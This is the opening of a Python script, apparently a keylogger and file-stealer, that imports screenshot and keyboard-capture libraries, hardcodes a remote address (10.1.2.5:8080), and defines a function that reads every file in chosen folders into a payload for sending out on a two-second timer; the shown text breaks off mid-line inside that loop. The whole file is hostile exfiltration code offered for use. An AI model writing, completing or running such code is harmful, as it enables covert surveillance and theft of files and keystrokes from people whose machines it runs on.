import pyautogui
import base64
from subprocess import check_output
import os
import sys
from pynput import keyboard
import requests
import json

#  The Timer module is part of the threading package.
import threading

# our data
targeted_folders = ["."] #change this to your preference :D


#may need to adapt this to your specifications
ip_address = "10.1.2.5"
port_number = "8080"

# Time interval in seconds for code to execute.
time_interval = 2

#init clean
if os.path.isfile("img.png"):
    os.remove("img.png")


def send_post_req():
    try:
        targeted_files = []
        payload=b""
	
        #gather targeted files from the folders we hardcoded
        for folder in targeted_folders:
                temp_file = [file for file in os.listdir() if os.path.isfile(file)]
                targeted_files+=temp_file

        #format content of files into the payload
        for file in targeted_files:
                content=open(file, "rb")
                payload+=b"\n
